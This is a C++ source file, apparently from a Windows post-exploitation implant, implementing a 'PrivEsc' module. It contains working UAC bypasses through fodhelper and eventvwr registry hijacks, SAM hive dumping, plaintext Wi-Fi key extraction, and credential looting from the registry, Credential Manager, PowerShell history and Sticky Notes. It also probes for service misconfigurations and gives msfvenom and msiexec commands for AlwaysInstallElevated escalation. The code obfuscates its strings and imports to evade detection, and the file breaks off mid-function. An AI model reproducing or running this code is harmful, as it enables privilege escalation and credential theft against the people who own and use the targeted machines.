#include "PrivEsc.h"
#include "Obf.h"
#include <wlanapi.h>

// Dynamic wlanapi loading — keeps wlanapi.dll out of import table
typedef DWORD (WINAPI* pfnWlanOpenHandle)(DWORD,PVOID,PDWORD,PHANDLE);
typedef DWORD (WINAPI* pfnWlanEnumInterfaces)(HANDLE,PVOID,PWLAN_INTERFACE_INFO_LIST*);
typedef DWORD (WINAPI* pfnWlanGetProfileList)(HANDLE,const GUID*,PVOID,PWLAN_PROFILE_INFO_LIST*);
typedef DWORD (WINAPI* pfnWlanGetProfile)(HANDLE,const GUID*,LPCWSTR,PVOID,PWSTR*,PDWORD,PDWORD);
typedef VOID  (WINAPI* pfnWlanFreeMemory)(PVOID);
typedef DWORD (WINAPI* pfnWlanCloseHandle)(HANDLE,PVOID);
static struct { pfnWlanOpenHandle Open; pfnWlanEnumInterfaces Enum;
                pfnWlanGetProfileList GetList; pfnWlanGetProfile GetProfile;
                pfnWlanFreeMemory Free; pfnWlanCloseHandle Close; } gWlan = {};
static bool LoadWlanApi() {
    if (gWlan.Open) return true;
    HMODULE h = LoadLibraryA(S("wlanapi.dll").c_str());
    if (!h) return false;
    gWlan.Open       = (pfnWlanOpenHandle)     GetProcAddress(h, S("WlanOpenHandle").c_str());
    gWlan.Enum       = (pfnWlanEnumInterfaces) GetProcAddress(h, S("WlanEnumInterfaces").c_str());
    gWlan.GetList    = (pfnWlanGetProfileList) GetProcAddress(h, S("WlanGetProfileList").c_str());
    gWlan.GetProfile = (pfnWlanGetProfile)     GetProcAddress(h, S("WlanGetProfile").c_str());
    gWlan.Free       = (pfnWlanFreeMemory)     GetProcAddress(h, S("WlanFreeMemory").c_str());
    gWlan.Close      = (pfnWlanCloseHandle)    GetProcAddress(h, S("WlanCloseHandle").c_str());
    return gWlan.Open != nullptr;
}

// ── Shared: write a registry string value ─────────────────────────────────────
static bool RegSetStr(HKEY hRoot, const char* subkey, const char* name, const char* val) {
    HKEY hKey = NULL;
    if (RegCreateKeyExA(hRoot, subkey, 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hKey, name, 0, REG_SZ,
                             (const BYTE*)val, (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
    RegCloseKey(hKey);
    return ok;
}

// ── UAC bypass helper: write COM handler keys, run binary, sleep, clean up ───
static std::string RunUacBypass(const char* comSubkey, const char* binaryName,
                                 const std::string& cmd) {
    // Write HKCU\Software\Classes\<comSubkey>\shell\open\command = cmd
    std::string cmdKey = std::string("Software\\Classes\\") + comSubkey +
                         "\\shell\\open\\command";

    if (!RegSetStr(HKEY_CURRENT_USER, cmdKey.c_str(), NULL, cmd.c_str())) {
        return std::string("uac (") + binaryName + "): registry write failed";
    }

    // DelegateExecute triggers the auto-elevation path
    if (!RegSetStr(HKEY_CURRENT_USER, cmdKey.c_str(), "DelegateExecute", "")) {
        RegDeleteTreeA(HKEY_CURRENT_USER,
                       (std::string("Software\\Classes\\") + comSubkey).c_str());
        return std::string("uac (") + binaryName + "): DelegateExecute write failed";
    }

    // Detection: fodhelper.exe / eventvwr.exe spawned from a medium-integrity process
    // triggers auto-elevation — no UAC prompt for the auto-elevate-capable binary itself
    char windir[MAX_PATH] = {};
    GetWindowsDirectoryA(windir, sizeof(windir) - 1);
    std::string exe = std::string(windir) + "\\System32\\" + binaryName;

    SHELLEXECUTEINFOA sei = {};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "open";
    sei.lpFile = exe.c_str();
    sei.nShow  = SW_HIDE;
    sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
    ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    // Clean up registry key — remove both the DelegateExecute value and the subtree
    RegDeleteTreeA(HKEY_CURRENT_USER,
                   (std::string("Software\\Classes\\") + comSubkey).c_str());

    return std::string("uac (") + binaryName + "): launched elevated: " + cmd;
}

std::string PrivEsc::FodhelperBypass(const std::string& cmd) {
    // ms-settings is handled by fodhelper.exe, which is a UAC auto-elevate binary.
    // Writing a COM hijack under HKCU\Software\Classes makes it use our command instead.
    return RunUacBypass("ms-settings", "fodhelper.exe", cmd);
}

std::string PrivEsc::EventvwrBypass(const std::string& cmd) {
    // eventvwr.exe (Event Viewer) auto-elevates and looks up mscfile handler.
    return RunUacBypass("mscfile", "eventvwr.exe", cmd);
}

std::string PrivEsc::SamDump(const std::string& outDir) {
    // SeBackupPrivilege required to save protected hives — available to SYSTEM/Admin.
    // After saving: use secretsdump.py -sam <SAM> -system <SYSTEM> -security <SEC> LOCAL
    struct HiveEntry { std::string subkey; std::string filename; HKEY root; };
    std::vector<HiveEntry> hives = {
        { S("SAM"),      S("SAM"),      HKEY_LOCAL_MACHINE },
        { S("SYSTEM"),   S("SYSTEM"),   HKEY_LOCAL_MACHINE },
        { S("SECURITY"), S("SECURITY"), HKEY_LOCAL_MACHINE },
    };

    std::string result;
    int saved = 0;

    for (auto& h : hives) {
        HKEY hKey = NULL;
        if (RegOpenKeyExA(h.root, h.subkey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            result += h.filename + ": RegOpenKeyEx failed err=" +
                      std::to_string(GetLastError()) + "\n";
            continue;
        }

        std::string outPath = outDir + "\\" + h.filename;

        // Detection: RegSaveKeyExA on HKLM\SAM from a non-SYSTEM process is a
        // high-confidence credential-access alert in Windows Defender and most EDRs.
        LONG rc = RegSaveKeyExA(hKey, outPath.c_str(), NULL, REG_LATEST_FORMAT);
        RegCloseKey(hKey);

        if (rc == ERROR_SUCCESS) {
            result += h.filename + ": saved -> " + outPath + "\n";
            ++saved;
        } else if (rc == ERROR_ALREADY_EXISTS) {
            // File exists — delete and retry once
            DeleteFileA(outPath.c_str());
            HKEY hKey2 = NULL;
            RegOpenKeyExA(h.root, h.subkey.c_str(), 0, KEY_READ, &hKey2);
            rc = hKey2 ? RegSaveKeyExA(hKey2, outPath.c_str(), NULL, REG_LATEST_FORMAT)
                       : ERROR_INVALID_HANDLE;
            if (hKey2) RegCloseKey(hKey2);
            if (rc == ERROR_SUCCESS) {
                result += h.filename + ": saved -> " + outPath + "\n";
                ++saved;
            } else {
                result += std::string(h.filename) + ": RegSaveKeyEx failed err=" +
                          std::to_string(rc) + "\n";
            }
        } else {
            result += std::string(h.filename) + ": RegSaveKeyEx failed err=" +
                      std::to_string(rc) +
                      " (need SYSTEM token — run tokensteal first)\n";
        }
    }

    if (saved > 0) {
        result += "\nExtract hashes offline:\n"
                  "  python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL";
    }
    return result;
}

// ── Wi-Fi password extraction ──────────────────────────────────────────────────
// Parse <keyMaterial> from the Wi-Fi profile XML.
static std::string ExtractKeyMaterial(const std::wstring& xml) {
    const wchar_t* tag = L"<keyMaterial>";
    const wchar_t* endtag = L"</keyMaterial>";
    size_t start = xml.find(tag);
    if (start == std::wstring::npos) return "(hidden or open)";
    start += wcslen(tag);
    size_t end = xml.find(endtag, start);
    if (end == std::wstring::npos) return "(malformed)";
    std::wstring wKey = xml.substr(start, end - start);
    int len = WideCharToMultiByte(CP_UTF8, 0, wKey.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (len <= 0) return "";
    std::string key(len - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wKey.c_str(), -1, &key[0], len, nullptr, nullptr);
    return key;
}

static std::string WstrToStr(const WCHAR* wstr) {
    if (!wstr) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
    if (len <= 0) return "";
    std::string s(len - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &s[0], len, nullptr, nullptr);
    return s;
}

std::string PrivEsc::WiFiDump() {
    HANDLE hWlan = NULL;
    DWORD dwVer = 0;

    // Detection: WlanOpenHandle + WlanGetProfile(WLAN_PROFILE_GET_PLAINTEXT_KEY)
    // from a non-service process is logged by Sysmon and Windows security events.
    if (!LoadWlanApi() || gWlan.Open(2, NULL, &dwVer, &hWlan) != ERROR_SUCCESS) {
        return "wifi: WlanOpenHandle failed (need admin)";
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    if (gWlan.Enum(hWlan, NULL, &pIfList) != ERROR_SUCCESS) {
        gWlan.Close(hWlan, NULL);
        return "wifi: WlanEnumInterfaces failed";
    }

    std::string result;
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; ++i) {
        PWLAN_INTERFACE_INFO pIface = &pIfList->InterfaceInfo[i];

        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        if (gWlan.GetList(hWlan, &pIface->InterfaceGuid, NULL, &pProfileList)
            != ERROR_SUCCESS) continue;

        for (DWORD j = 0; j < pProfileList->dwNumberOfItems; ++j) {
            const WCHAR* ssid = pProfileList->ProfileInfo[j].strProfileName;
            PWSTR pProfileXml = NULL;
            DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD dwGranted = 0;

            DWORD ret = gWlan.GetProfile(hWlan, &pIface->InterfaceGuid,
                                         ssid, NULL, &pProfileXml, &dwFlags, &dwGranted);
            if (ret == ERROR_SUCCESS && pProfileXml) {
                std::string key = ExtractKeyMaterial(std::wstring(pProfileXml));
                result += "SSID: " + WstrToStr(ssid) + "  Password: " + key + "\n";
                gWlan.Free(pProfileXml);
            } else {
                result += "SSID: " + WstrToStr(ssid) + "  Password: (access denied err=" +
                          std::to_string(ret) + ")\n";
            }
        }
        gWlan.Free(pProfileList);
    }

    gWlan.Free(pIfList);
    gWlan.Close(hWlan, NULL);

    return result.empty() ? "wifi: no saved profiles found" : result;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — LOOTING FOR PASSWORDS
// ═════════════════════════════════════════════════════════════════════════════

// ── Helper: read one registry string value ────────────────────────────────────
static void RegReadStr(HKEY root, const char* sub, const char* val,
                        const char* label, std::string& out) {
    HKEY hk = NULL;
    if (RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &hk) != ERROR_SUCCESS) return;
    char buf[512] = {}; DWORD sz = sizeof(buf)-1, type = 0;
    if (RegQueryValueExA(hk, val, NULL, &type, (BYTE*)buf, &sz) == ERROR_SUCCESS && sz > 1)
        out += std::string(label) + " = " + buf + "\n";
    RegCloseKey(hk);
}

std::string PrivEsc::RegistryPasswordSearch() {
    // Detection: RegQueryValueEx on Winlogon/VNC/PuTTY credential keys from a
    // non-interactive process is a high-confidence credential-access alert.
    std::string r;

    // Winlogon autologon credentials (cleartext password visible without admin)
    RegReadStr(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "DefaultUserName",   "Winlogon.DefaultUserName", r);
    RegReadStr(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "DefaultPassword",   "Winlogon.DefaultPassword", r);
    RegReadStr(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "AltDefaultUserName","Winlogon.AltDefaultUserName", r);
    RegReadStr(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "AltDefaultPassword","Winlogon.AltDefaultPassword", r);

    // VNC stored passwords (encrypted but often trivially crackable)
    RegReadStr(HKEY_LOCAL_MACHINE, "SOFTWARE\\RealVNC\\WinVNC4",
               "Password",        "VNC.RealVNC.Password", r);
    RegReadStr(HKEY_LOCAL_MACHINE, "SOFTWARE\\TightVNC\\Server",
               "Password",        "VNC.TightVNC.Password", r);
    RegReadStr(HKEY_LOCAL_MACHINE, "SOFTWARE\\TightVNC\\Server",
               "PasswordViewOnly","VNC.TightVNC.PasswordViewOnly", r);
    RegReadStr(HKEY_LOCAL_MACHINE, "SOFTWARE\\ORL\\WinVNC3",
               "Password",        "VNC.WinVNC3.Password", r);
    RegReadStr(HKEY_CURRENT_USER,  "SOFTWARE\\ORL\\WinVNC3",
               "Password",        "VNC.WinVNC3.User.Password", r);

    // SNMP community strings (can equal admin password)
    RegReadStr(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities",
        NULL, "SNMP.ValidCommunities", r);

    // PuTTY saved sessions (may store proxy passwords)
    HKEY hPut = NULL;
    const char* puttyBase = "Software\\SimonTatham\\PuTTY\\Sessions";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, puttyBase, 0, KEY_READ, &hPut) == ERROR_SUCCESS) {
        char sess[256] = {}; DWORD ssz = sizeof(sess); DWORD idx = 0;
        while (RegEnumKeyExA(hPut, idx++, sess, &ssz, NULL, NULL, NULL, NULL)
               == ERROR_SUCCESS) {
            std::string sub = std::string(puttyBase) + "\\" + sess;
            RegReadStr(HKEY_CURRENT_USER, sub.c_str(), "ProxyPassword",
                       (std::string("PuTTY.") + sess + ".ProxyPassword").c_str(), r);
            ssz = sizeof(sess);
        }
        RegCloseKey(hPut);
    }

    // Generic HKLM/HKCU password search across common software keys
    struct { HKEY root; const char* sub; const char* val; const char* lbl; } extra[] = {
        { HKEY_LOCAL_MACHINE, "SOFTWARE\\mRemoteNG", "Password", "mRemoteNG.Password" },
        { HKEY_CURRENT_USER,  "SOFTWARE\\mRemoteNG", "Password", "mRemoteNG.User.Password" },
        { HKEY_LOCAL_MACHINE, "SOFTWARE\\Cisco\\CiscoAnyConnect", "Password", "CiscoAnyConnect.Password" },
        { HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\MSSQL\\Parameters",
          "SA", "MSSQL.SA" },
    };
    for (auto& e : extra) RegReadStr(e.root, e.sub, e.val, e.lbl, r);

    return r.empty() ? "registry: no cleartext passwords found\n" : r;
}

// ── Helper: read a file (first 8 KB) and return contents ─────────────────────
static std::string ReadFilePart(const char* path) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return "";
    char buf[8192] = {}; DWORD rd = 0;
    ReadFile(hf, buf, sizeof(buf)-1, &rd, NULL);
    CloseHandle(hf);
    return std::string(buf, rd);
}

// ── Helper: case-insensitive substring check ──────────────────────────────────
static bool ContainsCI(const std::string& haystack, const char* needle) {
    std::string lo = haystack;
    for (auto& c : lo) c = (char)tolower((unsigned char)c);
    std::string n = needle;
    for (auto& c : n) c = (char)tolower((unsigned char)c);
    return lo.find(n) != std::string::npos;
}

std::string PrivEsc::PasswordFileSearch() {
    // Searches known credential file locations.
    // Detection: ReadFile on sysprep.xml / unattend.xml / web.config from a
    // non-SYSTEM process is flagged by file-access auditing and most EDRs.
    std::string r;

    // Unattended Windows setup files — often contain base64-encoded admin passwords
    const char* sysprepPaths[] = {
        "C:\\Windows\\System32\\Sysprep\\sysprep.xml",
        "C:\\Windows\\System32\\Sysprep\\sysprep.inf",
        "C:\\Windows\\Panther\\unattend.xml",
        "C:\\Windows\\Panther\\Unattend\\unattend.xml",
        "C:\\Windows\\Panther\\Unattended.xml",
        "C:\\Windows\\system32\\sysprep\\unattend.xml",
        "C:\\Windows\\SysWOW64\\sysprep\\unattend.xml",
        nullptr
    };
    for (int i = 0; sysprepPaths[i]; ++i) {
        if (GetFileAttributesA(sysprepPaths[i]) != INVALID_FILE_ATTRIBUTES) {
            std::string content = ReadFilePart(sysprepPaths[i]);
            r += std::string("FOUND: ") + sysprepPaths[i] + "\n";
            if (ContainsCI(content, "password")) r += "  [contains 'password' keyword]\n";
            if (ContainsCI(content, "autologon")) r += "  [contains 'autologon' keyword]\n";
        }
    }

    // IIS web.config files may hold database/SMTP credentials
    const char* iisPaths[] = {
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\inetpub\\wwwroot\\Web.config",
        nullptr
    };
    for (int i = 0; iisPaths[i]; ++i) {
        if (GetFileAttributesA(iisPaths[i]) != INVALID_FILE_ATTRIBUTES) {
            std::string content = ReadFilePart(iisPaths[i]);
            r += std::string("FOUND: ") + iisPaths[i] + "\n";
            if (ContainsCI(content, "password") || ContainsCI(content, "connectionstring"))
                r += "  [contains credential keywords]\n";
        }
    }

    // PowerShell console history — every command the user typed
    char appdata[MAX_PATH] = {};
    ExpandEnvironmentStringsA("%APPDATA%", appdata, sizeof(appdata));
    std::string psHist = std::string(appdata) +
        "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
    if (GetFileAttributesA(psHist.c_str()) != INVALID_FILE_ATTRIBUTES) {
        r += "FOUND (PS history): " + psHist + "\n";
        std::string h = ReadFilePart(psHist.c_str());
        if (ContainsCI(h, "password") || ContainsCI(h, "-pass") || ContainsCI(h, "securestring"))
            r += "  [contains credential keywords]\n";
        // Include last 20 lines as preview
        size_t pos = h.rfind('\n', h.size() > 800 ? h.size()-800 : 0);
        if (pos != std::string::npos) r += "  Last lines:\n  " + h.substr(pos+1) + "\n";
    }

    // Sticky Notes legacy file
    char local[MAX_PATH] = {};
    ExpandEnvironmentStringsA("%LOCALAPPDATA%", local, sizeof(local));
    std::string sticky = std::string(local) +
        "\\Microsoft\\Sticky Notes\\StickyNotes.snt";
    if (GetFileAttributesA(sticky.c_str()) != INVALID_FILE_ATTRIBUTES) {
        r += "FOUND (Sticky Notes): " + sticky + "\n";
        std::string s = ReadFilePart(sticky.c_str());
        if (ContainsCI(s, "password") || ContainsCI(s, "pass:"))
            r += "  [contains credential keywords]\n";
    }

    return r.empty() ? "files: no credential files found\n" : r;
}

std::string PrivEsc::PSHistory() {
    // Read PowerShell command history (ConsoleHost_history.txt).
    // Detection: ReadFile on PSReadLine history from a non-PowerShell process.
    char appdata[MAX_PATH] = {};
    ExpandEnvironmentStringsA("%APPDATA%", appdata, sizeof(appdata));
    std::string path = std::string(appdata) +
        "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";

    HANDLE hf = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE)
        return "pshist: file not found at " + path;

    DWORD fsz = GetFileSize(hf, NULL);
    DWORD toRead = min(fsz, (DWORD)32768);
    std::string content(toRead, '\0');
    DWORD rd = 0;
    // Read the tail of the file (most recent commands)
    if (fsz > toRead) SetFilePointer(hf, fsz - toRead, NULL, FILE_BEGIN);
    ReadFile(hf, &content[0], toRead, &rd, NULL);
    CloseHandle(hf);
    content.resize(rd);
    return "PSHistory (" + path + "):\n" + content;
}

std::string PrivEsc::StickyNotes() {
    // Sticky Notes UWP database (plum.sqlite) — SQLite, readable as text.
    // Detection: ReadFile on plum.sqlite from a non-Sticky-Notes process.
    char local[MAX_PATH] = {};
    ExpandEnvironmentStringsA("%LOCALAPPDATA%", local, sizeof(local));

    // UWP path
    std::string dbPath = std::string(local) +
        "\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe"
        "\\LocalState\\plum.sqlite";

    std::string r;
    if (GetFileAttributesA(dbPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        r += "FOUND (UWP Sticky Notes SQLite): " + dbPath + "\n";
        std::string content = ReadFilePart(dbPath.c_str());
        // SQLite: extract text between NUL bytes (notes are UTF-16 or UTF-8 blobs)
        for (size_t i = 0; i < content.size(); ++i) {
            if (content[i] >= 0x20 && content[i] < 0x7F) r += content[i];
            else if (content[i] == '\n') r += '\n';
        }
        r += "\n";
    }

    // Legacy Sticky Notes (.snt)
    std::string legacyPath = std::string(local) +
        "\\Microsoft\\Sticky Notes\\StickyNotes.snt";
    if (GetFileAttributesA(legacyPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        r += "FOUND (Legacy Sticky Notes): " + legacyPath + "\n";
        std::string content = ReadFilePart(legacyPath.c_str());
        for (size_t i = 0; i < content.size(); ++i)
            if (content[i] >= 0x20 && content[i] < 0x7F) r += content[i];
        r += "\n";
    }

    return r.empty() ? "sticky: no Sticky Notes database found\n" : r;
}

// ── Windows Credential Manager via dynamic CredEnumerate ─────────────────────
typedef BOOL (WINAPI* pfnCredEnum)(LPCSTR, DWORD, DWORD*, PVOID*);
typedef VOID (WINAPI* pfnCredFree)(PVOID);

std::string PrivEsc::StoredCredentials() {
    // Detection: CredEnumerateA called outside of expected credential-management processes.
    HMODULE advapi = GetModuleHandleA("advapi32.dll");
    auto pEnum = (pfnCredEnum)GetProcAddress(advapi, "CredEnumerateA");
    auto pFree = (pfnCredFree)GetProcAddress(advapi, "CredFree");
    if (!pEnum || !pFree) return "storedcreds: CredEnumerateA not available\n";

    DWORD count = 0; PVOID creds = nullptr;
    if (!pEnum(NULL, 0, &count, &creds))
        return "storedcreds: CredEnumerate failed (err=" +
               std::to_string(GetLastError()) + ")\n";

    std::string r = "Stored Credentials (" + std::to_string(count) + "):\n";

    // CREDENTIAL structure (matches wincred.h layout)
    struct CRED_HDR {
        DWORD Flags; DWORD Type;
        char* TargetName; char* Comment;
        FILETIME LastWritten[2];
        DWORD CredentialBlobSize; BYTE* CredentialBlob;
        DWORD Persist;
        DWORD AttributeCount; PVOID Attributes;
        char* TargetAlias; char* UserName;
    };

    for (DWORD i = 0; i < count; ++i) {
        auto c = (CRED_HDR*)((PVOID*)creds)[i];
        r += "  Target: " + std::string(c->TargetName ? c->TargetName : "(null)") + "\n";
        r += "  User:   " + std::string(c->UserName   ? c->UserName   : "(null)") + "\n";
        if (c->CredentialBlob && c->CredentialBlobSize > 0) {
            // Blob is often UTF-16 password
            std::string blob(c->CredentialBlobSize, '\0');
            memcpy(&blob[0], c->CredentialBlob, c->CredentialBlobSize);
            // Extract printable chars (strips UTF-16 null bytes)
            std::string pw;
            for (size_t j = 0; j < blob.size(); ++j)
                if (blob[j] >= 0x20 && blob[j] < 0x7F) pw += blob[j];
            if (!pw.empty()) r += "  Pass:   " + pw + "\n";
        }
        r += "\n";
    }

    pFree(creds);
    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — SERVICE MISCONFIGURATIONS
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::UnquotedServicePaths() {
    // Enumerate all services; flag those with unquoted binary paths containing spaces.
    // An attacker can plant a malicious binary at the intermediate path segment.
    // Detection: EnumServicesStatusEx + QueryServiceConfig enumeration from non-admin
    // is a low-noise but known recon pattern logged by Sysmon Event ID 7.
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) return "unquoted: OpenSCManager failed (need admin)\n";

    DWORD bytesNeeded = 0, svcCount = 0, resumeHandle = 0;
    EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                           SERVICE_STATE_ALL, NULL, 0, &bytesNeeded,
                           &svcCount, &resumeHandle, NULL);
    if (GetLastError() != ERROR_MORE_DATA && bytesNeeded == 0) {
        CloseServiceHandle(hSCM); return "unquoted: EnumServicesStatusEx failed\n";
    }

    std::vector<BYTE> buf(bytesNeeded);
    resumeHandle = 0;
    if (!EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                                SERVICE_STATE_ALL, buf.data(), bytesNeeded,
                                &bytesNeeded, &svcCount, &resumeHandle, NULL)) {
        CloseServiceHandle(hSCM); return "unquoted: EnumServicesStatusEx(2) failed\n";
    }

    std::string r;
    auto* svcs = (LPENUM_SERVICE_STATUS_PROCESSA)buf.data();
    for (DWORD i = 0; i < svcCount; ++i) {
        SC_HANDLE hSvc = OpenServiceA(hSCM, svcs[i].lpServiceName,
                                       SERVICE_QUERY_CONFIG);
        if (!hSvc) continue;

        DWORD cfgBytes = 0;
        QueryServiceConfigA(hSvc, NULL, 0, &cfgBytes);
        if (cfgBytes == 0) { CloseServiceHandle(hSvc); continue; }

        std::vector<BYTE> cfgBuf(cfgBytes);
        auto* cfg = (LPQUERY_SERVICE_CONFIGA)cfgBuf.data();
        if (QueryServiceConfigA(hSvc, cfg, cfgBytes, &cfgBytes) && cfg->lpBinaryPathName) {
            std::string path = cfg->lpBinaryPathName;
            // Unquoted if: doesn't start with '"' AND contains a space before any arg
            // (path component before first space could be hijacked)
            if (!path.empty() && path[0] != '"') {
                // Strip any args after the exe path
                std::string exe = path;
                // Look for space not inside quotes in the exe section
                bool hasSpace = (exe.find(' ') != std::string::npos);
                // Ignore common safe patterns: C:\Windows\system32\svchost.exe -k ...
                bool isSvchost = (exe.find("svchost") != std::string::npos);
                if (hasSpace && !isSvchost) {
                    r += std::string("VULN: ") + svcs[i].lpServiceName + "\n";
                    r += "  Path: " + path + "\n";
                    // Show the first hijackable intermediate path
                    size_t sp = exe.find(' ');
                    if (sp != std::string::npos) {
                        std::string candidate = exe.substr(0, sp);
                        size_t lastSlash = candidate.rfind('\\');
                        if (lastSlash != std::string::npos) {
                            std::string hijack = candidate.substr(0, lastSlash) + ".exe";
                            r += "  Hijack candidate: " + hijack + "\n";
                        }
                    }
                    r += "\n";
                }
            }
        }
        CloseServiceHandle(hSvc);
    }

    CloseServiceHandle(hSCM);
    return r.empty() ? "unquoted: no vulnerable service paths found\n" : r;
}

std::string PrivEsc::WeakServicePerms() {
    // Check if the current user can write to any service binary.
    // Detection: CreateFile(GENERIC_WRITE) attempt on service executable triggers
    // object-access audit events.
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) return "svcperms: OpenSCManager failed\n";

    DWORD bytesNeeded = 0, svcCount = 0, resumeHandle = 0;
    EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                           SERVICE_STATE_ALL, NULL, 0, &bytesNeeded,
                           &svcCount, &resumeHandle, NULL);
    std::vector<BYTE> buf(bytesNeeded);
    resumeHandle = 0;
    EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
                           SERVICE_STATE_ALL, buf.data(), bytesNeeded,
                           &bytesNeeded, &svcCount, &resumeHandle, NULL);

    std::string r;
    auto* svcs = (LPENUM_SERVICE_STATUS_PROCESSA)buf.data();
    for (DWORD i = 0; i < svcCount; ++i) {
        SC_HANDLE hSvc = OpenServiceA(hSCM, svcs[i].lpServiceName,
                                       SERVICE_QUERY_CONFIG);
        if (!hSvc) continue;
        DWORD cfgBytes = 0;
        QueryServiceConfigA(hSvc, NULL, 0, &cfgBytes);
        if (!cfgBytes) { CloseServiceHandle(hSvc); continue; }
        std::vector<BYTE> cfgBuf(cfgBytes);
        auto* cfg = (LPQUERY_SERVICE_CONFIGA)cfgBuf.data();
        if (QueryServiceConfigA(hSvc, cfg, cfgBytes, &cfgBytes) && cfg->lpBinaryPathName) {
            std::string path = cfg->lpBinaryPathName;
            // Strip leading quote if quoted
            if (!path.empty() && path[0] == '"') {
                path = path.substr(1);
                size_t eq = path.find('"');
                if (eq != std::string::npos) path = path.substr(0, eq);
            } else {
                // Find where exe ends (before first space)
                size_t sp = path.find(".exe");
                if (sp != std::string::npos) path = path.substr(0, sp + 4);
            }
            if (GetFileAttributesA(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
                CloseServiceHandle(hSvc); continue;
            }
            // Try opening the binary for write (non-destructive probe)
            HANDLE hf = CreateFileA(path.c_str(), GENERIC_WRITE,
                                     FILE_SHARE_READ, NULL, OPEN_EXISTING,
                                     FILE_ATTRIBUTE_NORMAL, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                CloseHandle(hf);
                r += std::string("WRITABLE: ") + svcs[i].lpServiceName + "\n";
                r += "  Binary: " + path + "\n";
                r += "  Replace this binary to hijack the service (if restartable).\n\n";
            }
        }
        CloseServiceHandle(hSvc);
    }

    CloseServiceHandle(hSCM);
    return r.empty() ? "svcperms: no writable service binaries found\n" : r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — WINDOWS INSTALLER (AlwaysInstallElevated)
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::AlwaysInstallElevated() {
    // If both HKCU and HKLM AlwaysInstallElevated = 1, any user can install
    // an MSI package as SYSTEM. Generate an MSI payload with:
    //   msfvenom -p windows/x64/exec CMD="net localgroup administrators <user> /add"
    //            -f msi -o evil.msi
    //   msiexec /quiet /qn /i evil.msi
    // Detection: HKCU + HKLM key query + msiexec running an unsigned MSI.

    auto queryDword = [](HKEY root, const char* sub, const char* val) -> DWORD {
        HKEY hk = NULL; DWORD data = 0, sz = sizeof(data);
        if (RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &hk) == ERROR_SUCCESS) {
            RegQueryValueExA(hk, val, NULL, NULL, (BYTE*)&data, &sz);
            RegCloseKey(hk);
        }
        return data;
    };

    const char* sub = "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer";
    DWORD hkcu = queryDword(HKEY_CURRENT_USER,  sub, "AlwaysInstallElevated");
    DWORD hklm = queryDword(HKEY_LOCAL_MACHINE, sub, "AlwaysInstallElevated");

    std::string r;
    r += "AlwaysInstallElevated:\n";
    r += "  HKCU = " + std::to_string(hkcu) + "\n";
    r += "  HKLM = " + std::to_string(hklm) + "\n";

    if (hkcu == 1 && hklm == 1) {
        r += "\n[VULNERABLE] Both keys are set to 1.\n";
        r += "Exploit: generate a malicious MSI and run:\n";
        r += "  msiexec /quiet /qn /i evil.msi\n";
        r += "The MSI installs as SYSTEM regardless of current user privileges.\n";
        r += "Generate payload:\n";
